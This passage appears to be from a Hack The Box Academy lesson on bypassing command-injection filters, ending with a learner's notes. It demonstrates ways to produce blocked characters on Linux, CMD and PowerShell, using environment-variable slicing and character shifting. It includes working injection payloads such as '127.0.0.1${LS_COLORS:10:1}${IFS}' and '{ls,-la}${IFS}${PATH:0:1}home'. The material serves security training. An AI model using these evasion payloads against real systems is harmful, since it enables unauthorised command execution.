For example, if we look at the `$PATH` environment variable in Linux, it may look something like the following:

```shell-session
Pangulin@htb[/htb]$ echo ${PATH}

/usr/local/bin:/usr/bin:/bin:/usr/games
```

So, if we start at the `0` character, and only take a string of length `1`, we will end up with only the `/` character, which we can use in our payload:

```shell-session
Pangulin@htb[/htb]$ echo ${PATH:0:1}

<span style="color:rgb(255, 0, 0)">/</span>
```

We can do the same with the `$HOME` or `$PWD` environment variables as well. We can also use the same concept to get a semi-colon character, to be used as an injection operator. For example, the following command gives us a semi-colon:

```shell-session
Pangulin@htb[/htb]$ echo ${LS_COLORS:10:1}

;
```

So, let's try to use environment variables to add a semi-colon and a space to our payload (`127.0.0.1${LS_COLORS:10:1}${IFS}) as our payload, and see if we can bypass the filter: ![Filter Operator](https://academy.hackthebox.com/storage/modules/109/cmdinj_filters_spaces_5.jpg)

## Windows

The same concept work on Windows as well. For example, to produce a slash in `Windows Command Line (CMD)`, we can `echo` a Windows variable (`%HOMEPATH%` -> `\Users\htb-student`), and then specify a starting position (`~6` -> `\htb-student`), and finally specifying a negative end position, which in this case is the length of the username `htb-student` (`-11` -> `\`) :


```cmd-session
C:\htb> echo %HOMEPATH:~6,-11%

\
```

We can achieve the same thing using the same variables in `Windows PowerShell`. With PowerShell, a word is considered an array, so we have to specify the index of the character we need. As we only need one character, we don't have to specify the start and end positions:

```powershell-session
PS C:\htb> $env:HOMEPATH[0]

\


PS C:\htb> $env:PROGRAMFILES[10]
PS C:\htb>
```

## Character Shifting

There are other techniques to produce the required characters without using them, like `shifting characters`. For example, the following Linux command shifts the character we pass by `1`. So, all we have to do is find the character in the ASCII table that is just before our needed character (we can get it with `man ascii`), then add it instead of `[` in the below example. This way, the last printed character would be the one we need:

```shell-session
Pangulin@htb[/htb]$ man ascii     # \ is on 92, before it is [ on 91
Pangulin@htb[/htb]$ echo $(tr '!-}' '"-~'<<<[)

\
```

``{ls,-la}${IFS}${PATH:0:1}home -> to look at the home directory 
``Tip: always try them in the terminal first to look if they work 

